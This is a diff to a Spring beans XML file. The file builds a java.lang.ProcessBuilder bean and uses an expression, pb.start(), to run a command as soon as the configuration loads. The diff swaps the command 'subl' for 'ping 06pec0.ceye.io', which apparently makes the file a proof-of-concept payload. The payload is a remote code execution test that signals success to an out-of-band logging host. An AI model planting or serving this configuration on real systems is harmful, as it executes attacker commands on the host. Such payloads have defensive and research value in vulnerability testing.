@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="subl" />
+     <constructor-arg value="ping 06pec0.ceye.io" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
